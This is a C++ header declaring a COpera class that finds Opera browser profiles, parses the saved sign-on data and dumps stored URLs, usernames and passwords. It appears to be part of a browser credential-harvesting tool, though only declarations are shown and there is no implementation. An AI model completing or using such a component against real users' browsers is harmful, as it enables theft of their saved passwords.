#pragma once

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>

#include <cstdio>
#include <iostream>
#include <memory>
#include <queue>

#include "md5.h"
#include "des.h"

//浏览器保存密码的结构体
struct get_Opera {
	wchar_t url[255];
	wchar_t user_name[255];
	wchar_t pass_name[255];
};

class COpera
{
public:
	COpera();
	~COpera();

public:
	//void SaveData(WCHAR *url, WCHAR *user, WCHAR *pass);
	//int DumpOP(WCHAR *profilePath, WCHAR *signonFile);
	int DumpSqlOP(WCHAR *profilePath, WCHAR *signonFile);

	static int parse_opera_signons(void*, int, char**, char**);

	WCHAR *GetOPProfilePath();
	WCHAR *GetOPProfilePath11();
	WCHAR *GetOPProfilePathNext();

	int DumpOpera(void);

public:
	std::queue<get_Opera> pOP;
};
